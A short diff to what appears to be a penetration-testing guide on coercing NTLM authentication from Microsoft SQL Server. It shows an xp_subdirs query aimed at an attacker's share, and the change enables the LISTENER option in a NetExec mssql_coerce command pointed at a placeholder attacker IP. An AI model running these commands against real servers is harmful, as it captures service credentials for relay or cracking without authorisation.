@@ -24,7 +24,7 @@ EXEC master.dbo.xp_subdirs '\\<attacker>\share';
 
 ```bash
 # NetExec coerces the authentication for you
-nxc mssql <target> -u user -p pass -M mssql_coerce   # -o LISTENER=<attacker-ip>
+nxc mssql <target> -u user -p pass -M mssql_coerce -o LISTENER=<attacker-ip>
 ```
 
 ## What to do with the coerced authentication
